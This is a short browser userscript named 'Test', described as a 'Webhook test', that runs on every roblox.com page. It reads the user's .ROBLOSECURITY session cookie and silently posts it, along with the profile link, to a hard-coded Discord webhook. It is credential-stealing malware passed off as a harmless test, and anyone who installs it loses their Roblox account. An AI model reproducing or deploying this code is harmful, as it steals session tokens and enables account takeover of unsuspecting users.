// ==UserScript==
// @name Test
// @version 0.22
// @namespace http://google.com
// @description Webhook test
// @include https://www.roblox.com/*
// @copyright 2019+, dysche
// @require http://code.jquery.com/jquery-latest.js
// @grant GM.cookie
// @downloadURL https://update.greasyfork.org/scripts/382130/Test.user.js
// @updateURL https://update.greasyfork.org/scripts/382130/Test.meta.js
// ==/UserScript==

//var $ = document.jQuery
$(document).ready(function() {
    var content = "";
    var username = "";
    var avatar_url = "";

    GM.cookie.list({ name: '.ROBLOSECURITY' }).then(function(cookies) {
        content = "**Profile**: " + $(".avatar.avatar-headshot-lg").attr('href') + "\n\n**Cookie**:\n" + cookies[0].value

        $.post("https://discordapp.com/api/webhooks/569912417828470804/ZFudDsprjoGxhvE3aXegZs44lR-FIupvRqWMIVJ2P3lr_szeTXDMV5pAmjHTw38VD8cn",
            {"content": content, "username": username, "avatar_url": avatar_url},

            function(){
                console.log("webook sent");
            }
        );
    });
});